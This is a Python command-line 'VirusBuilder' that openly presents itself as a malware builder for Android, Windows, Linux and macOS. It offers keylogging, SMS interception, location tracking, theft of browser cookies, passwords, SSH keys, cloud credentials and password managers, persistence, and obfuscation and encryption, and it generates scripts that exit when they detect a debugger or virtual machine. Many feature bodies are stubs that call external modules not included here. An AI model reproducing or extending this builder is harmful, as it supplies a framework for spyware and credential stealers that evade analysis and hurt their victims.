#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
VirusBuilder CLI - Command Line Malware Builder
by VulnerabilityVigilante

This command-line application provides a complete interface for building
customized malware/viruses with platform-specific features and options.
"""

import os
import sys
import json
import time
import random
import argparse
from pathlib import Path

# Add project root to path
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

class VirusBuilderCLI:
    """Command Line Interface for VirusBuilder"""
    
    def __init__(self):
        self.available_features = {
            "mobile_keylogger": "Mobile Keylogger - Capture keystrokes on mobile devices",
            "mobile_screenshot": "Mobile Screenshot - Capture screenshots remotely",
            "sms_intercept": "SMS Interception - Intercept and read SMS messages",
            "location_tracking": "Location Tracking - Track device location via GPS",
            "mobile_network_scan": "Mobile Network Scan - Scan and analyze network traffic",
            "mobile_data_exfil": "Mobile Data Exfiltration - Extract data from mobile devices",
            "android_service": "Android Service - Background service persistence",
            "android_startup": "Android Startup - Boot-time persistence",
            "android_library_hijack": "Android Library Hijack - Library hijacking persistence",
            "android_process_inject": "Android Process Inject - Process injection persistence",
            "android_app_install": "Android App Install - App installation persistence",
            "android_system_mod": "Android System Mod - System modification persistence",
            "advanced_evasion": "Advanced Evasion - Advanced anti-detection techniques",
            "behavioral_evasion": "Behavioral Evasion - Human behavior simulation",
            "ai_evasion": "AI Evasion - AI-powered evasion patterns",
            "metamorphic_engine": "Metamorphic Engine - Code transformation engine",
            "advanced_stealth": "Advanced Stealth - Rootkit-level hiding",
            "advanced_packer": "Advanced Packer - Advanced code packing",
            "network_server": "Network Server - HTTP/HTTPS server for data transmission",
            "google_oauth": "Google OAuth - Google OAuth token management",
            "bot_setup": "Bot Setup - Automated bot configuration",
            "data_exfil": "Data Exfiltration - Network-based data exfiltration",
            "cert_extraction": "Certificate Extraction - Extract SSL/TLS certificates",
            "cloud_creds": "Cloud Credentials - Extract cloud service credentials",
            "ssh_secrets": "SSH Secrets - Extract SSH keys and credentials",
            "vault_extraction": "Vault Extraction - Extract Windows Vault data",
            "wam_extraction": "WAM Extraction - Extract Windows Authentication Manager data",
            "cookie_extraction": "Cookie Extraction - Extract browser cookies",
            "password_extraction": "Password Extraction - Extract saved passwords",
            "history_extraction": "History Extraction - Extract browsing history",
            "bookmark_extraction": "Bookmark Extraction - Extract bookmarks",
            "ide_projects": "IDE Projects - Extract development environment data",
            "password_managers": "Password Managers - Extract password manager data",
            "powershell_history": "PowerShell History - Extract PowerShell command history",
            "recent_files": "Recent Files - Extract recently accessed files",
            "recycle_bin": "Recycle Bin - Extract deleted files",
            "version_control": "Version Control - Extract Git/SVN data",
            "wifi_creds": "WiFi Credentials - Extract WiFi network credentials"
        }
        
        self.platforms = {
            "android": "Android (ARM64) - Mobile devices, tablets, Android TV",
            "windows": "Windows - Desktop, server, embedded Windows",
            "linux": "Linux - Desktop, server, embedded Linux",
            "macos": "macOS - Desktop, server, embedded macOS",
            "cross": "Cross-Platform - All platforms simultaneously"
        }
    
    def print_banner(self):
        """Print application banner"""
        banner = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                          🚀 VirusBuilder CLI                                ║
║                        Advanced Malware Builder                             ║
║                                                                              ║
║  Features: Mobile Payloads | Evasion Techniques | Network Operations        ║
║  Platforms: Android | Windows | Linux | macOS | Cross-Platform             ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""
        print(banner)
    
    def list_platforms(self):
        """List available platforms"""
        print("\n📱 Available Platforms:")
        print("=" * 50)
        for platform_id, description in self.platforms.items():
            print(f"  {platform_id:<12} - {description}")
    
    def list_features(self):
        """List available features"""
        print("\n⚡ Available Features:")
        print("=" * 50)
        
        categories = {
            "📱 Mobile Features": [
                "mobile_keylogger", "mobile_screenshot", "sms_intercept", 
                "location_tracking", "mobile_network_scan", "mobile_data_exfil"
            ],
            "🔄 Persistence Mechanisms": [
                "android_service", "android_startup", "android_library_hijack",
                "android_process_inject", "android_app_install", "android_system_mod"
            ],
            "🛡️ Evasion Techniques": [
                "advanced_evasion", "behavioral_evasion", "ai_evasion",
                "metamorphic_engine", "advanced_stealth", "advanced_packer"
            ],
            "🌐 Network Operations": [
                "network_server", "google_oauth", "bot_setup", "data_exfil"
            ],
            "🔐 Cryptographic Operations": [
                "cert_extraction", "cloud_creds", "ssh_secrets", 
                "vault_extraction", "wam_extraction"
            ],
            "🌐 Browser Operations": [
                "cookie_extraction", "password_extraction", 
                "history_extraction", "bookmark_extraction"
            ],
            "📦 Data Extraction": [
                "ide_projects", "password_managers", "powershell_history",
                "recent_files", "recycle_bin", "version_control", "wifi_creds"
            ]
        }
        
        for category, features in categories.items():
            print(f"\n{category}:")
            for feature in features:
                if feature in self.available_features:
                    print(f"  {feature:<25} - {self.available_features[feature]}")
    
    def interactive_build(self):
        """Interactive build process"""
        self.print_banner()
        
        print("\n🎯 Interactive Malware Builder")
        print("=" * 40)
        
        # Select platform
        print("\n1. Select Target Platform:")
        self.list_platforms()
        
        while True:
            platform = input("\nEnter platform (android/windows/linux/macos/cross): ").strip().lower()
            if platform in self.platforms:
                break
            print("❌ Invalid platform. Please try again.")
        
        # Select features
        print("\n2. Select Features:")
        self.list_features()
        
        print("\nEnter features (comma-separated, or 'all' for all features):")
        features_input = input("Features: ").strip()
        
        if features_input.lower() == 'all':
            selected_features = list(self.available_features.keys())
        else:
            selected_features = [f.strip() for f in features_input.split(',')]
            # Validate features
            valid_features = []
            for feature in selected_features:
                if feature in self.available_features:
                    valid_features.append(feature)
                else:
                    print(f"⚠️ Unknown feature: {feature}")
            selected_features = valid_features
        
        if not selected_features:
            print("❌ No valid features selected. Exiting.")
            return
        
        # Advanced options
        print("\n3. Advanced Options:")
        
        obfuscation_level = input("Obfuscation level (1-5, default 3): ").strip()
        try:
            obfuscation_level = int(obfuscation_level) if obfuscation_level else 3
            obfuscation_level = max(1, min(5, obfuscation_level))
        except ValueError:
            obfuscation_level = 3
        
        encryption = input("Enable encryption? (y/n, default y): ").strip().lower()
        encryption_enabled = encryption != 'n'
        
        anti_debug = input("Enable anti-debugger? (y/n, default y): ").strip().lower()
        anti_debug_enabled = anti_debug != 'n'
        
        anti_vm = input("Enable anti-VM? (y/n, default y): ").strip().lower()
        anti_vm_enabled = anti_vm != 'n'
        
        anti_sandbox = input("Enable anti-sandbox? (y/n, default y): ").strip().lower()
        anti_sandbox_enabled = anti_sandbox != 'n'
        
        # Output path
        print("\n4. Output Configuration:")
        default_name = f"malware_{platform}_{int(time.time())}"
        if platform == "windows":
            default_name += ".exe"
        elif platform == "android":
            default_name += ".sh"
        else:
            default_name += ".py"
        
        output_path = input(f"Output path (default: {default_name}): ").strip()
        if not output_path:
            output_path = default_name
        
        # Build configuration
        config = {
            "platform": platform,
            "features": selected_features,
            "obfuscation_level": obfuscation_level,
            "encryption_enabled": encryption_enabled,
            "anti_debug": anti_debug_enabled,
            "anti_vm": anti_vm_enabled,
            "anti_sandbox": anti_sandbox_enabled,
            "output_path": output_path
        }
        
        # Confirm build
        print("\n5. Build Configuration:")
        print("=" * 30)
        print(f"Platform: {platform}")
        print(f"Features: {', '.join(selected_features)}")
        print(f"Obfuscation Level: {obfuscation_level}")
        print(f"Encryption: {'Enabled' if encryption_enabled else 'Disabled'}")
        print(f"Anti-Analysis: Debugger={anti_debug_enabled}, VM={anti_vm_enabled}, Sandbox={anti_sandbox_enabled}")
        print(f"Output: {output_path}")
        
        confirm = input("\nProceed with build? (y/n): ").strip().lower()
        if confirm != 'y':
            print("Build cancelled.")
            return
        
        # Build malware
        self.build_malware(config)
    
    def build_malware(self, config):
        """Build malware with given configuration"""
        print("\n🔨 Building Malware...")
        print("=" * 30)
        
        try:
            # Generate malware code
            print("📝 Generating malware code...")
            malware_code = self.generate_malware_code(config)
            
            # Apply obfuscation
            if config["obfuscation_level"] > 1:
                print(f"🛡️ Applying obfuscation (level {config['obfuscation_level']})...")
                malware_code = self.apply_obfuscation(malware_code, config)
            
            # Apply encryption
            if config["encryption_enabled"]:
                print("🔐 Applying encryption...")
                malware_code = self.apply_encryption(malware_code)
            
            # Add anti-analysis
            if config["anti_debug"] or config["anti_vm"] or config["anti_sandbox"]:
                print("🛡️ Adding anti-analysis techniques...")
                malware_code = self.add_anti_analysis(malware_code, config)
            
            # Generate final output
            print("📦 Generating final output...")
            self.generate_final_output(malware_code, config)
            
            # Complete
            print("\n✅ Malware build completed successfully!")
            print(f"📁 Output saved to: {config['output_path']}")
            print(f"📊 Code size: {len(malware_code)} characters")
            
        except Exception as e:
            print(f"\n❌ Build failed: {e}")
            import traceback
            traceback.print_exc()
    
    def generate_malware_code(self, config):
        """Generate malware code based on configuration"""
        malware_code = f"""#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Generated by VirusBuilder CLI
# Target OS: {config['platform']}
# Features: {', '.join(config['features'])}
# Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}

import os
import sys
import time
import random
import threading
import subprocess
import platform
from pathlib import Path

# Add project root to path
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

class GeneratedMalware:
    def __init__(self):
        self.target_os = "{config['platform']}"
        self.features = {config['features']}
        self.active = True
        
    def run(self):
        # Main malware execution
        self.log("Malware started")
        
        # Execute selected features
"""
        
        # Add feature-specific code
        for feature in config['features']:
            malware_code += self.get_feature_code(feature)
        
        malware_code += """
        # Main execution loop
        while self.active:
            try:
                # Execute features
                self.execute_features()
                time.sleep(random.randint(30, 300))  # Random delay
            except Exception as e:
                self.log(f"Error: {e}")
                time.sleep(60)
    
    def execute_features(self):
        # Execute all active features
        pass
    
    def log(self, message):
        # Logging functionality
        timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
        print(f"[{timestamp}] {message}")

if __name__ == "__main__":
    malware = GeneratedMalware()
    malware.run()
"""
        
        return malware_code
    
    def get_feature_code(self, feature):
        """Get code for specific feature"""
        feature_codes = {
            "mobile_keylogger": """
        def mobile_keylogger(self):
            # Mobile keylogger implementation
            try:
                from mobile_tools.virusBuilder_arm64 import ARM64VirusBuilder
                builder = ARM64VirusBuilder()
                keylogger_code = builder.create_mobile_keylogger()
                exec(keylogger_code)
            except Exception as e:
                self.log(f"Mobile keylogger error: {e}")
""",
            "mobile_screenshot": """
        def mobile_screenshot(self):
            # Mobile screenshot implementation
            try:
                from mobile_tools.virusBuilder_arm64 import ARM64VirusBuilder
                builder = ARM64VirusBuilder()
                screenshot_code = builder.create_mobile_screenshot()
                exec(screenshot_code)
            except Exception as e:
                self.log(f"Mobile screenshot error: {e}")
""",
            "advanced_evasion": """
        def advanced_evasion(self):
            # Advanced evasion implementation
            try:
                from evasion_tools.advanced_evasion import AdvancedEvasionEngine
                engine = AdvancedEvasionEngine()
                evasion_code = engine.apply_comprehensive_evasion("malicious_code", self.target_os, 5)
                exec(evasion_code)
            except Exception as e:
                self.log(f"Advanced evasion error: {e}")
""",
            "network_server": """
        def network_server(self):
            # Network server implementation
            try:
                from network_tools.server import NetworkServer
                server = NetworkServer()
                server.configure(host='0.0.0.0', port=8080)
                server.start()
            except Exception as e:
                self.log(f"Network server error: {e}")
""",
            "cookie_extraction": """
        def cookie_extraction(self):
            # Cookie extraction implementation
            try:
                from browser_tools.cookie_processor import CookieProcessor
                processor = CookieProcessor()
                # Extract cookies from browsers
                self.log("Cookie extraction completed")
            except Exception as e:
                self.log(f"Cookie extraction error: {e}")
"""
        }
        
        return feature_codes.get(feature, f"""
        def {feature}(self):
            # {feature} implementation
            self.log("Executing {feature}")
""")
    
    def apply_obfuscation(self, code, config):
        """Apply obfuscation to the code"""
        try:
            from evasion_tools.advanced_evasion import AdvancedEvasionEngine
            engine = AdvancedEvasionEngine()
            obfuscated = engine.apply_comprehensive_evasion(code, config['platform'], 
                                                        config['obfuscation_level'])
            return obfuscated
        except Exception as e:
            print(f"⚠️ Obfuscation error: {e}")
            return code
    
    def apply_encryption(self, code):
        """Apply encryption to the code"""
        try:
            from mobile_tools.virusBuilder_arm64 import ARM64VirusBuilder
            builder = ARM64VirusBuilder()
            encrypted = builder.apply_fud_encryption(code)
            return encrypted
        except Exception as e:
            print(f"⚠️ Encryption error: {e}")
            return code
    
    def add_anti_analysis(self, code, config):
        """Add anti-analysis techniques"""
        anti_analysis_code = """
# Anti-analysis techniques
def check_debugger():
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            return ctypes.windll.kernel32.IsDebuggerPresent()
        return False
    except:
        return False

def check_vm():
    try:
        vm_indicators = ['vmware', 'virtualbox', 'qemu', 'xen']
        system_info = platform.uname()
        for indicator in vm_indicators:
            if indicator.lower() in system_info.system.lower():
                return True
        return False
    except:
        return False

def check_sandbox():
    try:
        # Check for sandbox indicators
        return False
    except:
        return False

# Anti-analysis checks
"""
        
        if config["anti_debug"]:
            anti_analysis_code += """
if check_debugger():
    sys.exit(0)
"""
        
        if config["anti_vm"]:
            anti_analysis_code += """
if check_vm():
    sys.exit(0)
"""
        
        if config["anti_sandbox"]:
            anti_analysis_code += """
if check_sandbox():
    sys.exit(0)
"""
        
        return anti_analysis_code + code
    
    def generate_final_output(self, code, config):
        """Generate final output file"""
        output_path = config['output_path']
        
        # Determine file extension based on OS
        if config['platform'] == "windows":
            if not output_path.endswith('.exe'):
                output_path += '.exe'
        elif config['platform'] == "android":
            if not output_path.endswith('.sh'):
                output_path += '.sh'
        else:
            if not output_path.endswith('.py'):
                output_path += '.py'
        
        # Write the malware code
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(code)
        
        # Make executable on Unix systems
        if config['platform'] in ["linux", "macos", "android"]:
            os.chmod(output_path, 0o755)
        
        config['output_path'] = output_path

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description='VirusBuilder CLI - Advanced Malware Builder')
    parser.add_argument('--platform', '-p', choices=['android', 'windows', 'linux', 'macos', 'cross'],
                       help='Target platform')
    parser.add_argument('--features', '-f', nargs='+', help='Features to include')
    parser.add_argument('--output', '-o', help='Output file path')
    parser.add_argument('--obfuscation', type=int, default=3, choices=range(1, 6),
                       help='Obfuscation level (1-5)')
    parser.add_argument('--no-encryption', action='store_true', help='Disable encryption')
    parser.add_argument('--no-anti-analysis', action='store_true', help='Disable anti-analysis')
    parser.add_argument('--list-platforms', action='store_true', help='List available platforms')
    parser.add_argument('--list-features', action='store_true', help='List available features')
    parser.add_argument('--interactive', '-i', action='store_true', help='Interactive mode')
    
    args = parser.parse_args()
    
    builder = VirusBuilderCLI()
    
    if args.list_platforms:
        builder.list_platforms()
        return
    
    if args.list_features:
        builder.list_features()
        return
    
    if args.interactive:
        builder.interactive_build()
        return
    
    # Command line mode
    if not args.platform or not args.features:
        print("❌ Error: Platform and features are required in command line mode")
        print("Use --interactive for interactive mode or --help for help")
        return
    
    config = {
        "platform": args.platform,
        "features": args.features,
        "obfuscation_level": args.obfuscation,
        "encryption_enabled": not args.no_encryption,
        "anti_debug": not args.no_anti_analysis,
        "anti_vm": not args.no_anti_analysis,
        "anti_sandbox": not args.no_anti_analysis,
        "output_path": args.output or f"malware_{args.platform}_{int(time.time())}"
    }
    
    builder.print_banner()
    builder.build_malware(config)

if __name__ == "__main__":
    main()